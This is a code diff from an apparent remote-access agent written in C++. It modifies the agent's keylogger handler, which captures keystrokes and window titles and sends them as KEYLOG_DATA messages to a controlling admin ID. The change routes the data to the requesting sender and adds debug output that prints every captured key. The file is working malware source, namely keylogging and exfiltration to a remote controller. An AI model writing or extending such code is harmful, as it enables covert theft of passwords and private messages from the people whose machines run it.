@@ -11,6 +11,7 @@
 #include "ReverseProxyHandler.h"
 #include "FileType.h"
 #include <chrono>
+#include <iostream>
 
 namespace rslm {
     namespace client {
@@ -228,11 +229,20 @@ namespace rslm {
                     return;
                 }
 
-                // --- Keylogger ---
+                // --- Keylogger (avec logs) ---
                 if (request.type == KEYLOG_START) {
+                    std::string senderId = request.senderId;  // Copier pour la lambda
+                    std::cout << "[Agent] Keylogger start requested, adminId=" << senderId << std::endl;
+
                     messages::KeyloggerHandler::Start(
-                        [](const std::string& window, const std::string& text) {
-                            if (!g_push) return;
+                        [senderId](const std::string& window, const std::string& text) {
+                            std::cout << "[Agent] Key captured: window=" << window << ", text=" << text << std::endl;
+
+                            if (!g_push) {
+                                std::cout << "[Agent] ERROR: g_push is null!" << std::endl;
+                                return;
+                            }
+
                             net::json payload = {
                                 {"windowTitle", window},
                                 {"text", text},
@@ -240,9 +250,11 @@ namespace rslm {
                                     std::chrono::system_clock::now().time_since_epoch()).count()}
                             };
                             auto msg = net::Message::CreateRequest(
-                                KEYLOG_DATA, g_agentId, g_adminId, payload);
+                                KEYLOG_DATA, g_agentId, senderId, payload);
                             g_push(msg);
+                            std::cout << "[Agent] Keylog data sent" << std::endl;
                         });
+
                     Reply(request, { {"status", "capturing"} });
                     return;
                 }
